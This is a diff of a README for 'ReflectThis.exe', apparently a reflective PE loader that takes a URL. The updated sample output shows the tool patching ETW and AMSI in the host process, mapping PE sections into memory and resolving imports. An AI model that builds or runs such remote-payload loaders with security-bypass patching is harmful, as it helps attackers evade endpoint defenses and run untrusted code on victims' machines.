@@ -9,19 +9,25 @@
 ## Usage
 ```ps
 > .\ReflectThis.exe [url] [args...]
-resolving function GetCommandLineA -> 5c18c0
-resolving function GetCurrentProcess -> 77be3550
-resolving function GetProcAddress -> 77bdfb80
-resolving function FreeLibrary -> 77be11b0
-resolving function VirtualQuery -> 77bdfba0
-resolving function GetProcessHeap -> 77bdf9b0
-resolving function HeapFree -> 77bde590
-resolving function HeapAlloc -> 77de5e70
-resolving function GetLastError -> 77bde640
-resolving function GetModuleHandleW -> 77be1520
-resolving function IsProcessorFeaturePresent -> 77be1240
-resolving function GetStartupInfoW -> 77be1c20
-resolving function SetUnhandledExceptionFilter -> 77be1df0
-resolving function UnhandledExceptionFilter -> 77bf62e0
+[-] Patched EWT in host at 77b713c0
+[-] Patched AMSI in host at 65935960
+[-] copying PE section NT Header (01268CE8) -> 00400000
+[-] copying PE section .text (012690E8) -> 00401000
+[-] copying PE section .rdata (0126C2E8) -> 00405000
+[-] copying PE section .data (0126DAE8) -> 00407000
+[-] copying PE section .msvcjmc↨ (0126DCE8) -> 00408000
+[-] copying PE section .rsrc (0126DEE8) -> 00409000
+[-] copying PE section .reloc (0126E0E8) -> 0040A000
+[-] resolving function GetCommandLineA -> 213f2
+[-] resolving function GetModuleHandleA -> 77a31130
+[-] resolving function GetProcAddress -> 77a2fb80
+[-] resolving function LoadLibraryA -> 77a312a0
+[-] resolving function GetCurrentProcess -> 77a33550
+[-] resolving function FreeLibrary -> 77a311b0
+[-] resolving function VirtualQuery -> 77a2fba0
+[-] resolving function GetProcessHeap -> 77a2f9b0
+[-] resolving function HeapFree -> 77a2e590
+[-] resolving function HeapAlloc -> 77b55e70
+[-] resolving function GetLastError -> 77a2e640
 ...SNIP...
 ```
